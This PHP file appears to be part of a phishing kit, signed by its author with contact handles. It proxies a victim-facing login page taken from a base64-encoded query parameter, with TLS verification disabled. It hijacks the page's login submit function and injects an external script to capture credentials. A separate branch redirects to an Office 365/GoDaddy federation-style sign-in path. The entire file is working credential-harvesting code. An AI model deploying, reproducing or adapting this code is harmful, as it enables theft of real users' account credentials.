<?php
// THIS SCRIPT CODED BY K Russsia
// Skype : @hotmail.com ,, live:.cid.f3cae5649395bbe
// ICQ : 79099398

function get_url(){
	$urls = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	$b = parse_url($urls);
	$a = $b['scheme'].'://'.$b['host'].''.$b['path'];
	$a = str_replace(basename($a), '', $a);
	return $a;
}

(!isset($_GET['u']) || empty($_GET['u'])) ? die() : '';
$url = ($_GET['u'] == 'godaddy')? 'godaddy': base64_decode($_GET['u']);

if($url == 'godaddy'){
	$user = $_GET['user'];
	header("Location: go.php?user=$user&realm=pass&app=o365&username=blapuaya&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=");
}else{
	$domain = parse_url($url);
	$domain = $domain['scheme'].'://'.$domain['host'].'/';
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_POST ,FALSE);  
	curl_setopt($ch, CURLOPT_URL, $url); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE); 
	curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36"); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
	$result = curl_exec ($ch);
	curl_close ($ch);
	/*
	$pattern = '~(href|src)=(["\'])(?!#|//|http)([^\2]*)\2~i';
	while (preg_match($pattern, $result)) {
		$result = preg_replace($pattern,'$1="'.$domain.'$3"', $result);
	}
	*/
	$result = str_replace('<head>', '<head> <base href="'.$domain.'" target="_blank">', $result);
	
	$result = str_replace('Login.submitLoginRequest()', 'Login.submitLoginRequests()', $result);
	echo $result;
	echo '<script>var url = "'.$url.'"</script>';
	echo '<script src="'.get_url().'include/src/fed.js"></script>';
}
?>